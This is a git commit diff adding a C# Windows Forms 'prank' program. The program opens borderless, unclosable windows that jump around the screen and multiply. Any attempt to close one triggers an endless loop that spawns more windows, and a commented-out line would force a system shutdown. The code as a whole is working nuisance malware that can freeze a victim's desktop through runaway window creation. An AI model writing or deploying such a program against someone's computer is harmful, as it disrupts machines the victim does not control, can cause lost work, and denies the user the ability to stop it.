788835375047a0ee42dd3586ed241638c14ec6f8
Jaw0r3k <jaw0r3k.g@gmail.com>
2024-03-16 22:36:42 +0100

    Add project files.

---
+++ Form1.Designer.cs
@@ -0,0 +1,67 @@
+﻿namespace popping_up_prank
+{
+    partial class Form1
+    {
+        /// <summary>
+        ///  Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        ///  Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        ///  Required method for Designer support - do not modify
+        ///  the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            pictureBox = new PictureBox();
+            ((System.ComponentModel.ISupportInitialize)pictureBox).BeginInit();
+            SuspendLayout();
+            // 
+            // pictureBox
+            // 
+            pictureBox.Image = Properties.Resources.PrankImage;
+            pictureBox.Location = new Point(-205, -61);
+            pictureBox.Name = "pictureBox";
+            pictureBox.Size = new Size(1145, 610);
+            pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
+            pictureBox.TabIndex = 0;
+            pictureBox.TabStop = false;
+            // 
+            // Form1
+            // 
+            AutoScaleDimensions = new SizeF(8F, 20F);
+            AutoScaleMode = AutoScaleMode.Font;
+            ClientSize = new Size(798, 451);
+            ControlBox = false;
+            Controls.Add(pictureBox);
+            FormBorderStyle = FormBorderStyle.None;
+            Name = "Form1";
+            ShowIcon = false;
+            ShowInTaskbar = false;
+            Text = "Form1";
+            FormClosing += Form1_FormClosing;
+            Load += Form1_Load;
+            ((System.ComponentModel.ISupportInitialize)pictureBox).EndInit();
+            ResumeLayout(false);
+        }
+
+        #endregion
+
+        private PictureBox pictureBox;
+    }
+}
---
+++ Form1.cs
@@ -0,0 +1,51 @@
+using System.Diagnostics;
+
+namespace popping_up_prank
+{
+    public partial class Form1 : Form
+    {
+        private int windows = 0;
+
+        public Form1()
+        {
+            InitializeComponent();
+            this.pictureBox.TabIndex = 2137;
+            this.pictureBox.TabStop = false;
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            new Thread(new ThreadStart(this.Thread)).Start();
+        }
+        private void Thread()
+        {
+            while (true)
+            {
+                System.Threading.Thread.Sleep(1000);
+                this.Invoke((Delegate)(() => this.RandomizePosition()));
+            }
+        }
+        private void RandomizePosition()
+        {
+            Random random = new Random();
+            this.Location = new Point((int)(random.NextDouble() * (double)Screen.PrimaryScreen.Bounds.Width) - this.Width / 2, (int)(random.NextDouble() * (double)Screen.PrimaryScreen.Bounds.Height) - this.Height / 2);
+            if (random.Next(0, 10) >= 5)
+                return;
+
+            if (this.windows >= 35)
+            {
+                return;
+            }
+            new Form1().Show();
+            this.windows += 1;
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            e.Cancel = true;
+            // Process.Start("shutdown", "/s /t 5");
+            while (true)
+                new Form1().Show();
+        }
+    }
+}
